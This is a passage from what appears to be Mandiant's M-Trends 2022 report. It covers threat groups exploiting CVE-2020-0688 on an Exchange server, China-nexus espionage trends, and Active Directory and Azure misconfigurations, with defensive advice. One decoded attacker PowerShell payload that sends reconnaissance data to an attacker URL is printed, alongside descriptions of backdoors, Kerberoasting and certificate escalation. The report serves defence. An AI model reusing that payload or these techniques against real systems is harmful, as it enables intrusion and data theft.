For an incident in which a published vulnerability is suspected to have been 
leveraged, investigation of the observed effect—such as this coinminer—is a 
necessary but insufficient condition of comprehensive incident response. Extensive 
scoping and the pursuit of alternate hypotheses help customers ensure they 
have taken reasonable steps to secure their environments post\-breach. Mandiant 
investigators use thorough scoping and delivered datasets to identify potential 
investigative threads and iterate the process to fully explore possibilities. 

This methodology enabled Mandiant to identify not only the source of the 
compromise and the actions of the threat actor but also evidence of malicious 
activity that represented the existence of two state\-based threat actors operating 
in parallel within the environment. All three threat groups leveraged the same critical 
vulnerability to compromise the environment but represented different operating 
models commonly observed during investigations. Where the financially motivated 
threat group was satisfied with the deployment of a coinminer, the other two groups 
(UNC3016 and APT41\) performed reconnaissance, deployed persistence mechanisms 
and used post\-exploitation tools.

UNC3016

In February 2020, shortly after PoC code for CVE\-2020\-0688 was released, a threat 
group Mandiant tracks as UNC3016 compromised the customer’s Microsoft Exchange 
server through that vulnerability. Mandiant identified 52 encoded commands stored 
with the URL VIEWSTATE query variable of requests destined for the Microsoft ECP 
application. Figure 2 provides the decoded contents of the earliest attacker payload 
in which the attacker began their system reconnaissance efforts by collecting 
details regarding the Exchange install path. The information collected during 
reconnaissance was then transferred to attacker\-controlled infrastructure.

Figure 2: Decoded attacker payload.

”$t \= $env:exchangeinstallpath;$b \= \[Convert]::ToBase64String(\[System.Text.
Encoding]::Unicode.GetBytes($t));iwr \-Uri http://REDACTED/$b \-UseBasicParsing” 

Within days of the initial compromise, UNC3016 issued 37 HTTP requests with 
VIEWSTATE parameters designed to concatenate Base64 encoded strings into a file 
that was then decoded using the Windows utility certutil. The end result was a web\-
based backdoor providing UNC3016 remote command execution via the Windows 
Command Line Interpreter (CLI). The web based backdoor allowed the threat group 
to maintain the same means of access via HTTP with features and conveniences not 
expressible through the CVE\-2020\-0688 vulnerability.

With this foothold established, UNC3016 proceeded to create and upload additional 
web shells and attacker utilities. Many of the tools used during this incident 
were publicly available and could be used legitimately or maliciously. To gather 
additional credentials once inside the network, UNC3016 used the SysInternals 
utility ProcDump that is commonly used to monitor for CPU spikes but is also used 
by various threat groups to access process memory which may contain passwords. 
Mandiant also identified evidence to indicate UNC3016 used the freely available 
network mapping tool Advanced IP Scanner to perform network reconnaissance. 
When UNC3016 needed more complex capabilities, it used more obscure tooling 
such as Secure Socket Funneling (SSF) and SharpChisel to create secure proxies 
through which the attacker could route Remote Desktop Protocol (RDP) connections 
and move further into the environment. UNC3016 used this pattern to access over 
30 endpoints in the customer’s internal environment. In some cases, UNC3016 used 
Impacket WMIExec or POWGOOP to run commands on select systems. As higher 
interest systems were identified, a combination of RazorSQL and FileZilla enabled 
UNC3016 to extract sensitive data.

Despite UNC3016’s reliance on publicly available and generally noisy post\-
exploitation tools, Mandiant identified instances in which UNC3016’s capabilities 
veered into more obscure territory. During forensic analysis of the Exchange servers, 
Mandiant identified a custom backdoor in the form of an IIS module written in C\+\+. 
This newly discovered malware that Mandiant now tracks as RUDEVISIT provided 
the threat group with a stealthy way to run commands remotely via the Windows CLI 
under the SYSTEM user context. Once the malware was registered as a native\-code 
HTTP module, RUDEVISIT inspected the HTTP headers of incoming requests. If a 
request contained the HTTP header “Cf\-Ray\-Visitor”, RUDEVISIT would decode and 
execute the Base64 encoded value via the Windows CLI. 

SPECIAL REPORT \| MANDIANT M\-TRENDS 202275

While compromise through CVE\-2020\-0688 requires the use of HTTP query 
strings that are commonly logged on most platforms, the use of a backdoor to run 
commands through HTTP headers may indicate UNC3016’s intent to remain hidden. 
Logging HTTP headers is an uncommon practice given the volume of headers in 
general web usage. RUDEVISIT demonstrates UNC3016 has the means to extend their 
capabilities beyond that of publicly available tools while maintaining a relatively quiet 
presence within the environment and moving to complete their objective.

APT41

Strong log retention policy has long been a mainstay of security recommendations. 
This customer’s excellent logging on the compromised Exchange servers provided 
Mandiant a lens into the initial entry point for multiple threat groups. The nature of 
the vulnerability and the attack made it possible to reconstruct attacker activity 
above and beyond the ability of traditional forensic methods. 

In June 2020, the threat group APT41 leveraged CVE\-2020\-0688 to compromise 
the customer’s on\-premises Exchange servers. Mandiant identified 638 malicious 
VIEWSTATE payloads issued to the ECP application. By reconstructing the payload 
activity, Mandiant discovered that APT41 quickly shifted from reconnaissance 
commands to establishing a foothold through the deployment of a CHOPPER web 
shell and the backdoor DUSTCOVER. While some variants of DUSTCOVER contain an 
embedded payload, the variant discovered during this investigation read an external 
payload from disk and launched it in memory. Mandiant had previously observed 
APT41 using DUSTCOVER to launch Cobalt Strike BEACON and CROSSWALK. Based 
on reverse engineering analysis of the sample acquired during the reconstruction of 
attacker commands, this variant of DUSTCOVER launched BEACON.

Given the time between initial compromise and discovery, the recovery of files 
created and deleted by APT41 was limited. However, the ECP logs provided Mandiant 
the ability to “replay” the creation of three files no longer present on the file Exchange 
server at the time of analysis. The analysis of three reconstructed files resulted 
in the discovery of a new malware family Mandiant now tracks as PIDGINSPUR. A 
Windows Batch script served to configure persistence for the malware as well as 
execute it. Reverse engineering analysis determined that the payload ran Cobalt 
Strike BEACON. 

Mandiant was also unable to rely on Windows Security Event logging to track APT41’s 
lateral movement through the environment. The investigative team relied heavily 
on the Windows Server User Access Logging (UAL) databases resident on Windows 
servers. The UAL database, stored under %SYSTEMROOT%\\System32\\LogFiles\\
Sum, keeps track of up to three years of user logins, DNS history and other valuable 
system activity. By parsing the data contained in the UAL databases, the team was 
able to reconstruct APT41’s movement across the internal environment and identify 
systems of interest.

Reconstruction of APT41’s activities through the Exchange logs, coupled with 
forensics analysis of the Exchange system, provided Mandiant with additional 
indicators of compromise used to hunt for malicious activity across the broader 
environment. The iterative identification and reorienting process, enabled through 
extensive logging within the customer environment, allowed Mandiant to provide 
greater confidence in findings associated with a known stealthy threat group.

DUSTCOVER is an in\-memory 
dropper written in C that 
Mandiant attributes to APT41\. 

PIDGINSPUR is a launcher 
written in .NET that decrypts 
a separate payload and maps 
it into the memory of a newly 
created process.

Considerations for Security Advancement

It is important to maintain and build on the basics of security program development 
regardless of advances in security technology. Long standing security program 
initiatives such as asset management, log retention policies and vulnerability and 
patching management can act as force multipliers for incident responders. 

Identification of the initial vector of compromise would have been severely limited 
without access to comprehensive logging. While endpoint forensics tends to be 
foundational for Mandiant investigations, it relies on artifacts that weren’t specifically 
designed with investigations in mind. This puts a natural ceiling on the levels of 
confidence that can be applied during single\-source investigations. 

Similarly, threat actors are becoming more mindful of the trails they may leave behind 
for an investigation. The ability to identify a threat actor in one environment and 
apply intelligence from that specific campaign to as many environments as possible 
introduces repercussions to actions that may expose a threat actor’s presence in an 
environment. This duplicative effect of threat intelligence continues to put pressure on 
threat actors seeking to undertake long\-running campaigns.

Security initiatives such as log retention and asset management are rarely simple 
solutions for organizations. A good log retention strategy requires an understanding of 
the environment and investment in storage and log transmission. Asset management 
solutions require investment in technology as well as consistent discipline and 
review. With respect to incident response, each investment in security becomes a 
measure against potential risk and the hypothetical value of that resource during an 
investigation. 

As organizational security programs mature, a mindset shift from detection to 
response can help drive additional changes. This use case shows how a strong log 
retention policy not only helps custodians of systems troubleshoot operational issues, 
but also serves to better inform incident responders. It would be simple to conclude 
that the coinminer exposed the efforts of two advanced threat groups but doing so 
would gloss over a substantial amount of human effort. The coinminer certainly started 
the process, but the efforts of the customer and their logging practices paired with a 
thorough investigative methodology and comprehensive threat intelligence ultimately 
ejected three threat groups from the customer environment.

The ability to identify a threat actor in one environment 
and apply intelligence from that specific campaign 
to as many environments as possible introduces 
repercussions to actions that may expose a threat 
actor’s presence in an environment.

CYBER OPERATIONS

BACKGROUND

Historically, The People’s Republic of China has focused its national security 
efforts on ensuring military and economic supremacy through a combination of 
trade agreements, rapid technological developments, military modernization, 
legal reforms and cyber espionage activities. China has used its cyber capabilities 
to pursue state goals of securing regional hegemony and buttressing efforts to 
assert itself internationally. In 2013, Mandiant exposed the People’s Liberation Army 
(PLA) Unit 61398 and labeled it as an advanced persistent threat: APT1\.16 The report 
detailed the group’s long\-standing computer espionage campaign against the U.S., 
other nations and private organizations. When the report was published, the extent 
of evidence pointing to Chinese state sponsorship, and the quantity of networks and 
companies compromised by China\-nexus APTs had reached staggering numbers. 

The TTPs for these groups followed a pattern and trend in Chinese activity that 
allowed aggregate TTPs to further inform security analysts. After publication of the 
APT1 report and subsequent U.S. government response to Chinese cyber activity, 
Mandiant data from 2014\-2016 began to show an overall decline in compromises by 
China\-nexus groups. The apparent decline in observable incidents may reflect the 
shift within China’s own bureaucracy, where the centralization of state power and 
the restructuring of the military apparatus resulted in a move away from prolific 
amateur cyber\-attacks in favor of more focused, professionalized, and sophisticated 
attacks conducted by a smaller set of actors. Targets of cyber espionage are not 
chosen at random; they are carefully selected and derived from priorities taken 
from official government material such as the Five\-Year Plans, domestic and 
national defense white papers and other policy platforms. Mandiant believes there 
is a direct correlation between Beijing’s national economic development plan, the 
official 14th Five\-Year Plan, that can be used to forecast future targets of cyber 
espionage activity.

Realignment and Retooling

Since President Xi Jinping rose to power in 2012, China has continued to work toward 
transforming its military and associated cyber operations into a cyber power worthy 
of international attention. Xi Jinping has worked to centralize power over both the 
government and security forces, including the PLA and the Ministry of State Security 
(MSS). Through meticulous bureaucratic and structural reorganizations, and at 
times, geographical changes, Xi effectively changed the way cyber operations are 
conducted by China. One of his first reforms involved the establishment of the PLA’s 
Strategic Support Force (SSF) and its subordinate Network Systems Department 
(NSD) in 2016\. This is often seen as the main driver of current and future Chinese 
cyber operations. 

In 2021, with the implementation of the 14th Five\-Year Plan, China’s efforts continued 
to focus on supporting the Belt and Road Initiative (BRI), with additional attention to 
areas such as technology, financials, energy, telecommunications and healthcare. 
The Plan focuses heavily on increasing Chinese national self\-reliance by growing 
domestic markets to reduce the impact of trade disputes. It also includes mentions 
of modernizing industry and supply chains, increasing “military\-civil unity” and 
synchronizing “national defense and economic progress.” These national\-level 
priorities signal an upcoming increase in China\-nexus actors conducting intrusion 
attempts against intellectual property or other strategically important economic 
concerns, as well as defense industry products and other dual\-use technologies over 
the next few years. 

The latest plan also introduces a new concept of Chinese network power. This 
concept should be viewed as a subset of comprehensive and overall national power. 
In acquiring the network infrastructure and connections to peripheral technologies 
such as the Internet of Things (IoT), network power combines technology and 
strategy to create a pervasive system that can be exploited by China for both internal 
and external reconnaissance and surveillance campaigns. This strategy has already 
proven successful as Beijing is able to target hardened, more challenging targets 
indirectly through various supply chain and third\-party victim compromises to 
extract political, economic, defense and surveillance information.

Despite the apparent observable decline in Chinese cyber activity between 2014\-
2016, China\-nexus APTs continued to operate, sometimes using commercial off\-
the\-shelf malware, and often practicing improved operational security. Starting 
in 2017, Mandiant began to observe China\-nexus cyber espionage actors returning 
to a regular operational tempo. In most cases, groups have re\-emerged with new 
malware or TTPs. In other cases, individual actors that were part of dormant groups 
may have been reorganized into new operational teams or reassigned to existing 
known threat groups. As a result, we are seeing an increasing number of activity 
clusters, or uncategorized threat actors (UNCs), created around Chinese cyber 
espionage activity. Between 2016 and 2021 we observed activity from 244 distinct 
Chinese cyber espionage UNC actor sets. The gradual adoption of the same exploit 
code among Chinese espionage groups prior to the release of public patches 
suggests the existence of a shared development and logistics infrastructure and a 
centralized coordinating entity.

Espionage Activity Reemerges

Geographically, Asia and U.S. are consistently the most targeted regions by Chinese 
espionage actors. Of the 244 distinct Chinese cyber espionage actor sets observed 
by Mandiant from 2016\-2021, 36 were still active in 2021, with approximately 15% of 
their targets U.S. entities. 

In 2021, we also noted multiple Chinese cyber espionage actor sets use the same 
malware families, suggesting the possibility of a Grand Quartermaster developer. 
While the overlapping use of publicly available tools provides reduced development 
costs, ease of deployment and extensive modularity, these tools can also obfuscate 
attribution and analysis. The overlap of custom tools may reflect resource sharing 
across groups or a centralized development and distribution center led by a shared 
development and logistics infrastructure.

Government organizations were the most targeted sector across all industries 
globally, with seven of the active 36 active Chinese APT and UNC groups collecting 
sensitive information from public entities. This focus on government organizations 
has held steady since 2018\. However, we observed a decrease in the overall number 
of Chinese cyber espionage actors focusing on government entities from 2019 to 
2021\. Mandiant believes some of the identified Chinese cyber espionage activity in 
2021 is related to existing APTs or other clusters of UNCs. This is consistent with 
Mandiant’s assessment that UNC activity is an evolution of previously identified 
groups that we have not yet merged due to changes in TTPs, targeting or motivations. 
Changes have also led to a rapid increase in information operations originating from 
China targeting both internal and external dissidents and human rights activities.

APT10

APT10 changed operational TTPs following the 2018 U.S. Department of Justice 
(DOJ) indictment of two group members believed to have acted in association with 
the Chinese Ministry of State Security’s Tianjin State Security Bureau. In November 
2020, Mandiant noted the re\-emergence of this activity with the use of new tools 
including the HEAVYHAND loader and the DARKTOWN backdoor. In 2021 we also 
observed the use of the HEAVYPOT backdoor and RIVERMEAL, used for lateral 
movement.

APT41

APT41 is a prolific cyber threat group that carries out Chinese\-state sponsored 
espionage activity as well as financially motivated activity potentially outside of state 
control. Activity attributed to APT41 traces back to 2012, when individual members 
of APT41 conducted primarily financially motivated operations focused on the video 
game industry before expanding into likely state\-sponsored activity. APT41 members 
were indicted by the U.S. DOJ in September 2020; however, we continued to observe 
operations through 2021\.

Conference Crew

Mandiant initially observed Conference Crew predominantly targeting military and 
private industry in the U.S. defense and aerospace sector from 2011 to 2017\. We also 
observed Conference Crew target entities in Southeast Asia, as well as an education 
entity in 2021\. The group has been around for so long that Mandiant still calls it by an 
older, non\-APT naming designation.

Outlook

After many breaches, a concerted effort by the U.S., U.K., and other European 
governments resulted in a July 2021 statement attributing extensive cyber espionage 
operations, including exploits of Microsoft Exchange server vulnerabilities and 
ransomware campaigns to China\-nexus APTs and clusters of activity. While China 
appears to have refrained from conducting destructive cyber\-attacks that cause 
overt damage to critical infrastructure, it has used disruptive attacks as well as 
disinformation campaigns to help enforce censorship policies within its own borders. 
Mandiant continues to track information operations campaigns we assess with 
high confidence to be operating in a coordinated, inauthentic manner in support 
of the political interests of the PRC. Given the more aggressive nature of Beijing’s 
international diplomacy, along with the broader cyber espionage campaigns 
conducted by China\-nexus threat actors, we anticipate that cyber espionage activity 
in support of China’s national security and economic interests will continue to 
accelerate in the coming year.

COMMON 
MISCONFIGURATIONS 
THAT LEAD TO 
COMPROMISE

83

Active Directory is the most commonly used on\-premises identity provider solution 
across organizations, used by approximately 90% of the Global Fortune 1000\.17 With 
the rise of cloud adoption and integration, Active Directory is now commonly used in 
a hybrid model to manage and sync user identities for both on\-premises and cloud 
environments. Many organizations use on\-premises Active Directory to synchronize 
identities with Azure Active Directory to achieve a single integrated identity solution 
for accessing applications and services.

Based on Mandiant incident response investigations, we have observed 
misconfigurations with the hybrid identity model, which has resulted in privilege 
escalation, vertical movement and persistence by adversaries. 

On\-Premises Misconfigurations
Kerberoasting highly privileged user account\-based 
Service Principal Names 

A service principal name (SPN) within Active Directory is a representation of a service 
instance. An SPN can be registered for a computer or user account to associate a 
service instance. For an account configured with an SPN, any authenticated account 
within Active Directory can request and receive the Ticket Granting Service (TGS) 
ticket for the associated SPN account, which will be encrypted with the account’s 
password hash. Adversaries commonly target SPNs registered with high privileged 
user accounts to extract the password hash and escalate privileges within Active 
Directory. This technique is referred to as Kerberoasting. 

Figure 3\. PowerShell cmdlet to Identify User (non\-computer) Accounts Configured with an SPN.

Get\-ADUser \-filter {(ServicePrincipalName \-like “\*”)}

Mandiant recommends generating strong, unique passwords (for example, 25\+ 
characters) and changing passwords regularly for user (non\-computer) accounts 
configured with SPNs. Furthermore, permissions should be reviewed and reduced 
for these accounts to ensure that the concept of least\-privilege is enforced. This 
process can be automated by using Managed Service Accounts (MSAs) for non\-
computer accounts that require an SPN association. MSAs provide automatic 
password management and the ability to delegate account management to specific 
administrators.

GPO edit permissions for non\-privileged users

Group Policy Objects (GPO) are used to centrally configure and manage user and 
computer security settings within Active Directory. Privileged users with delegated 
rights can modify GPO settings, which can ultimately impact the security state for 
objects within Active Directory. Organizations often delegate permissions to modify 
GPOs to specific security groups and accounts. Examples of default security groups 
with permissions to modify GPOs include:

• Domain Admins

• Enterprise Admins

• Group Policy Creator Owners

Adversaries often target and compromise accounts in specific groups that can 
edit GPOs to modify domain\-based security settings. Ransomware operators use 
this technique to push malicious binaries (encryptors) to many systems in short 
timeframe. Adversaries can also abuse GPOs to gain privileged access on endpoints. 
By modifying user rights assignment settings they can obtain local administrative 
permissions or configure services for persistent access. 

Mandiant recommends organizations review GPO settings to identify groups and 
accounts that have GPO edit permissions. These represent an extended attack 
surface for hardening and protection.

 } }

Privileged user account usage over non\-tier 0 assets

In 2021, Mandiant continued to observe flat Active Directory architectures that 
allowed highly privileged accounts to be used for access across all endpoints. This 
resulted in privileged account credentials being exposed on endpoints (in memory) 
and then accessed and used by attackers using various credential dumping tools 
such as Mimikatz. Authentication methods that expose credentials in memory on 
endpoints include: 

• Interactive logons

• Logons using Remote Desktop Protocol (RDP)

• RunAs – Allows a user to execute binaries in the context of another specified account 

• runas /noprofile /user:\\administrator cmd.exe 

(Figure 2 Cmdlet to run cmd.exe within the context of the account “Administrator”)

• PowerShell WinRM with CredSSP

• PsExec with explicit credentials

SPECIAL REPORT \| MANDIANT M\-TRENDS 202285

Mandiant recommends that organizations implement explicit restrictions that only 
allow for privileged accounts to be used from specific privileged access workstations 
or Tier 0 assets that reside in restricted and protected VLANs and segments. This 
can be achieved by enforcing an Active Directory architecture with a tiering model 
that restrict account usage across a category of assets (Tier 0–Tier 2\). Guardrail 
enforcement and logon restrictions for privileged accounts can be defined within 
GPOs (user rights assignments) or by using authentication policy silos (Windows 
Server 2012 R2 domain\-functional level or above). 

Use of unconstrained delegation

In Active Directory, delegation allows a service to impersonate the client for a 
single sign\-on experience. When unconstrained delegation is enabled on a front\-
end service, the service can receive the Kerberos ticket of the user who requests 
access to the destination service. Adversaries often target and compromise systems 
enabled with unconstrained delegation to extract Kerberos tickets from memory and 
impersonate accounts within an environment. If privileged accounts are accessing 
endpoints configured with unconstrained delegation, this can lead to privilege 
escalation within a domain. 

Mandiant recommends that organizations identify endpoints configured with 
unconstrained delegation and migrate them to use constrained delegation for 
specific services only.

Figure 6\. PowerShell cmdlet to List Privileged Users that can be Delegated.

Get\-ADUser \-Filter {(AdminCount \-eq 1\) \-and (AccountNotDelegated \-eq $false)}

Beginning with Microsoft Windows Server 2012 R2 and Windows 8\.1, the “Protected 
Users” security group was introduced to manage credential exposure for privileged 
accounts. Members of this group automatically have non\-configurable protections 
applied to their accounts, including:

• The Kerberos ticket granting ticket (TGT) expires after four hours, rather than the 

normal 10\-hour default setting.

• Cached credentials are blocked; a domain controller must be available to 

authenticate the account.

• Plaintext passwords are not cached for Windows Digest authentication or default 

credential delegation (CredSSP), regardless of the endpoint’s applied policy 
settings.

• NTLM one\-way function (NTOWF) is blocked.

• DES and RC4 cannot be used for Kerberos pre\-authentication (Server 2012 R2 or 

higher).

• Accounts cannot be used for either constrained or unconstrained delegation

SPECIAL REPORT \| MANDIANT M\-TRENDS 202286

For privileged accounts that do not explicitly require an option for delegation, 
Mandiant recommends enabling “Account is sensitive and cannot be delegated” 
within the “Account” tab for the accounts using Active Directory Users and 
Computers. This setting will restrict the account accordingly.

Figure 7\. Check the Box for “Account is sensitive and cannot be delegated”.

Certificate template permits Domain Admin escalation

Active Directory Certificate Services (AD CS) is a Microsoft platform that offers 
public key infrastructure (PKI) functionality to facilitate capabilities such as 
Encrypting File System (EFS), domain authentication, digital signatures and email 
security. AD CS Certification Authorities (CA) issue certificates based on the 
Certificate Signing Request (CSR) from the user or machine based on published 
templates. Templates define parameters such as certificate validity, certificate 
usage and application policy permissions for security principals.

A common misconfiguration that Mandiant observed was certificate templates 
that could permit the requestor to specify a subject alternate name (SAN). If a 
template enables certificate requests with both domain authentication and a SAN, 
an authenticated domain user could potentially request and receive a certificate with 
a privileged account included as a SAN. The authenticated domain user could then 
access domain\-based resources within the context of the privileged user.

Figure 8\. Certificate Template to Allow Subject Alternate Name. 

SPECIAL REPORT \| MANDIANT M\-TRENDS 202287

Recommended hardening configurations to secure Microsoft 
Certificate Authority (CA) servers:
• Treat CAs and subordinate CAs as Tier 0 assets and enforce logon restrictions to 

minimize the scope of accounts with elevated access for certificate servers.

• Enforce multi\-factor authentication (MFA) for CA management access.

• Review published certificate templates to ensure that suspicious or malicious 

templates have not been introduced.

Figure 9\. Windows command line program to Display Published Templates.

certutil.exe \-TCAInfo 

• Review the security permissions assigned to all published certificate templates 

and validate the scope of enrollment and write permissions delegated to security 
principals.

Figure 10\. Windows command line program to Display Permissions of Published Templates.

certutil.exe \-v \-dsTemplate

• Enforce manager approvals for certificate signing request (CSR) templates that 

allow for a SAN.

• Review certificate policies to verify if the EDITF\_ATTRIBUTESUBJECTALTNAME2 
configuration is included. This configuration within a certificate policy allows for 
a certificate authority to permit SAN information to be included as part of the 
certificate signing request. This setting applies to the entire certificate authority, 
and all other certificate templates issued by that certificate authority.

Figure 11\. Windows command line program to Validate the Existence of the Flag EDITF\_
ATTRIBUTESUBJECTALTNAME2\.

certutil.exe –getreg policy

• For the use of templates with sensitive Enhanced Key Usage (EKU), limit enrollment 
permissions to predefined users or groups. Certificates with EKU can be used for 
multiple purposes.

• Audit and review the NTAuthCertificates container in Active Directory to validate 
the referenced CA certificates. The NTAuthCertificates AD object defines CA 
certificates that enable authentication within Active Directory. This object has 
an array of trusted CA certificates. Before authenticating a principal, AD checks 
the NTAuthCertificates object entry for the CA specified in the authenticating 
certificate’s Issuer field to validate the authenticity of the CA. 

• Protect CA private keys at the hardware level using a Hardware Security Module 

(HSM) to avoid private key theft that uses DPAPI backup protocols. 

• Enable audit logging for certificate services on CA servers and monitor the 

certificate enrollment process and CA backup events.

• Monitor Domain Controller certificate\-based authentication events.

• Use public tools such as PSPKIAudit to validate and identify misconfigurations in 

certificate templates

Microsoft Azure and Microsoft 365 Configuration Risks

Throughout 2021, many organizations continued to expand the scope of migrating 
applications, services and data from off\-premises to cloud\-hosted infrastructure. 
Adversaries correspondingly augmented their efforts in developing novel and 
sophisticated techniques to target identities and data housed in cloud environments 
such as Microsoft Azure and Microsoft SaaS platforms (Microsoft 365\). 

Identities without multi\-factor authentication (MFA) 
enforcement resulted in unauthorized access

Mandiant continued to observe that organizations not enforcing multi\-factor 
authentication (MFA) to protect identities and access to cloud\-based infrastructure 
fell victim to adversaries using either stolen credentials or password spraying to 
gain unauthorized access to cloud\-hosted applications and data. Not only were 
adversaries using these techniques to target cloud\-based resources; on\-premises 
applications were also susceptible. Such applications included VPN gateways, 
remote access services, virtual desktop infrastructure (VDI) and email and 
messaging services. 

Mandiant recommends that organizations not only enforce strong and complex 
password policies for accounts, but require the use of MFA to access external\-facing 
resources from remote or untrusted locations. Organizations can use Azure AD 
features such as Conditional Access policies (CAPs) to enforce MFA and Azure AD 
password protections to restrict the use of known or weak passwords commonly 
susceptible to password\-spraying attacks. 

Legacy authentication to bypass MFA in Azure AD 

One of the most common methods used by attackers to gain access to Azure tenants 
is credential theft or password spraying with legacy authentication protocols. 
Legacy authentication protocols do not support MFA and (if enabled) can be used to 
gain access to hosted data and resources via Azure AD.

Some commonly known legacy authentication protocols that can be 
used to gain access to Microsoft 365 include:

• Exchange Active Sync (EAS)

• Autodiscover

• IMAP4

• MAPI over HTTP (MAPI/HTTP)

• Offline Address Book (OAB)

• Outlook Service

• POP3

• Reporting Web Services

• Exchange Representational State Transfer (REST)

• Outlook Anywhere (RPC over HTTP)

• Authenticated SMTP

• ActiveSync

SPECIAL REPORT \| MANDIANT M\-TRENDS 202289

Modern authentication capabilities include multi\-factor authentication (MFA) using 
smart cards, certificate\-based authentication (CBA) and third\-party SAML identity 
providers. Modern authentication is based on the Active Directory Authentication 
Library (ADAL) and OAuth v2\.0\. Mandiant recommends that organizations determine 
if legacy authentication protocols are enabled for Microsoft 365 access, and 
implement either the Security Defaults feature or Conditional Access policies that 
disable legacy authentication protocols and enforce modern authentication. 

Accounts or applications that require basic (legacy) authentication should have 
Conditional Access policies enforced to restrict use to trusted IP ranges. In the 
long\-term, accounts and applications should be upgraded to support modern 
authentication.

Privileged Identities Synced from On\-Premises Infrastructure

Mandiant continued to observe adversaries compromising on\-premises accounts 
configured with global administrative (or elevated) permissions within Azure AD, 
enabling vertical movement from on\-premises to the cloud. In many instances, 
organizations had conditional access policies configured to not require MFA when 
accessing Azure from trusted IP ranges (correlating to the IP ranges used for 
on\-premises configurations). Once an adversary had access to the on\-premises 
infrastructure, they could move vertically to the cloud, create new accounts and 
further expand the scope of their access. 

Mandiant recommends that organizations review the scope of on\-premises accounts 
synced to Azure AD and have the Global Administrator role (and additional elevated 
roles)assigned. If accounts are assigned elevated roles, organizations should either 
configure them as dedicated cloud\-only accounts (that require MFA regardless of 
location) or use Microsoft Privileged identity Management (PIM) to enforce both time\- 
and approval\-based role assignments.

Relaxed firewall rules on cloud\-hosted virtual machines

Overly permissive firewall rules were another common trend observed in 2021\. They 
allowed an adversary to remotely access external\-facing virtual machines hosted 
in cloud tenants. An adversary that remotely accesses virtual machines can extract 
data, deploy ransomware binaries or malicious backdoors and either move laterally 
within the cloud tenant or vertically to on\-premises infrastructure.

Mandiant recommends that organizations filter the scope of network traffic that can 
flow in and out of virtual network subnets and network interfaces using a stringent 
Azure network security group. A network security group contains security rules that 
allow or deny inbound network traffic to, or outbound network traffic from, several 
types of Azure components.

SPECIAL REPORT \| MANDIANT M\-TRENDS 2022A Bastion Host is an external\-
facing server intended to provide 
access to a private network from 
an external network, such as the 
Internet being used to remotely 
manage cloud based resources.

90

Unused ports and protocols should be removed; threat actors can use them to gain 
initial access, move laterally, and potentially steal sensitive data. At a minimum, 
ports and protocols commonly used for remote management should be blocked from 
external networks. Example ports and protocols include:

• SMB (TCP/445, TCP/135, TCP/139\)

• Remote Desktop Protocol (TCP/3389\)

• Windows Remote Management (WinRM)/Remote PowerShell (TCP/80, 

TCP/5985, TCP/5986\) 

• Windows Management Instrumentation (WMI) (dynamic port range 

assigned through Distributed Component Object Model (DCOM))

As a best practice, if remote access to virtual machines running in cloud tenants is 
required, organizations should use bastion hosts to govern connectivity. 

Overly\-permissive roles assigned to non\-privileged users

Azure role\-based access control (RBAC) is the control point for authorization to 
access Azure resources. To provide access, roles need to be assigned to either 
cloud\-only or synchronized accounts. In 2021, Mandiant observed overly\-permissive 
roles being assigned to non\-privileged accounts. Once compromised, these non\-
privileged accounts were used by adversaries to elevate privileges to move laterally, 
compromise additional accounts and resources and access data housed in either 
Azure or on\-premises infrastructure. Azure subscription roles commonly exploited 
by adversaries include: 

• The Contributor role, used to manage and make changes over resources contained 

within the subscription. Adversaries can abuse this role to extract data from 
resources such as databases and storage accounts within a subscription

• The Virtual Machine Contributor role, used to manage all virtual machines. 

Adversaries can abuse this role using various tactics, such as via the Azure Run 
Command interface to deploy backdoors or ransomware, extract credentials and 
data and move vertically to on\-premises infrastructure. Adversaries can also delete 
virtual machine instances using this role and impact the availability of applications 
and services accessible using virtual machines.

• The Application Administrator role is used to manage applications registered 

within Azure AD. Adversaries can abuse this role by configuring and associating 
passwords or certificates with applications for persistent access and to elevate 
privileges within an Azure tenant.

• The Application Impersonation role in Exchange Online, used by adversaries to 

read and send emails as any user within an Microsoft 365 subscription.

Mandiant recommends that organizations transition away from assigning permanent 
privileged roles to designated accounts and focus on integrating a just\-in\-time 
method for approving and assigning elevated roles. Within Azure, Microsoft PIM is 
a scalable solution that provides both time and approval\-based role assignments, 
integrated with access criteria and full auditing capabilities. 

SPECIAL REPORT \| MANDIANT M\-TRENDS 202291

Illicit consent grants attacks

Adversaries often create and register malicious applications with Azure to attempt 
to gain persistent access to data and applications such as Exchange Online. Mandiant 
observed adversaries exploiting this method of access when organizations had 
allowed non\-privileged users to approve consents for external applications to access 
data housed in Azure or Microsoft 365\. Adversaries could use a phishing attack 
to trick a user into providing the consent required for this level of access. Once a 
malicious application has been granted consent, it collects the access token and has 
account\-level access to data without the need for the user’s credentials. 

Mandiant recommends that organizations review their Azure and Microsoft 365 
subscription configuration settings and verify hardening settings:

• Enforce user\-consent settings so users cannot consent to allow third\-party 
application access. Application consents can also be restricted to only allow 
applications from verified publishers or for specific low\-risk permissions.

• Regularly review consented permissions for external applications.

• Implement an application governance policy to monitor third\-party application 

behavior. Microsoft Cloud App Security (MCAS) can be used to detect risky OAuth 
Applications and to review application permissions in the Azure portal.

Risky Azure API permissions delegated to single or 
multi\-tenant applications

An Azure registered application can use applications or delegated permissions 
without an interactive user signed into the application. Such permissions require 
administrator consent. After an administrator provides consent, the permissions are 
assigned to the service principal associated with the application.

In 2021, Mandiant identified instances where an adversary compromised an account 
assigned the Application Administrator role in Azure, which gave the adversary a way 
to gain persistent access. They could add either an application or service principal 
credential (password or certificate) to use the legitimate permissions assigned to the 
application. In some instances, the applications were assigned permissions within 
multiple Azure (consumer) tenants, opening the pathway for a supply chain attack. 
The adversary could pose as an authorized (trusted) application and move laterally 
across various consumer tenants.

Mandiant recommends that organizations review the API permissions assigned 
to applications and understand the scope of permissions assigned to registered 
applications in Azure. Application behavior can be monitored using playbooks. Use 
Azure native features such as Azure Monitor Workbooks to analyze application usage. 
Azure Monitor Workbooks can be used for data analysis and to create visualization 
reports. Organizations should also perform periodic reviews of both applications and 
service principals configured with credentials and proactively rotate the credentials 
periodically.

SPECIAL REPORT \| MANDIANT M\-TRENDS 202294

The cyber threat landscape is vast and deep and regularly influenced by the world 
around us. When the COVID\-19 pandemic began, we observed an uptick in targeting 
of healthcare and research and development. Now, at the time of publishing M\-Trends 
2022, the situation unfolding in Ukraine shows how tightly the geopolitical and cyber 
worlds are intertwined.

Our mission at Mandiant is to ensure every organization is secure from cyber threats 
and confident in their readiness. The annual M\-Trends report represents significant 
effort towards advancing that mission with the use of data and learnings from our 
incident response engagements.

The global median dwell time is now 21 days, down from 24 days last year, which is 
a downward trend we like to see. A trend we don’t like to see is the continued use of 
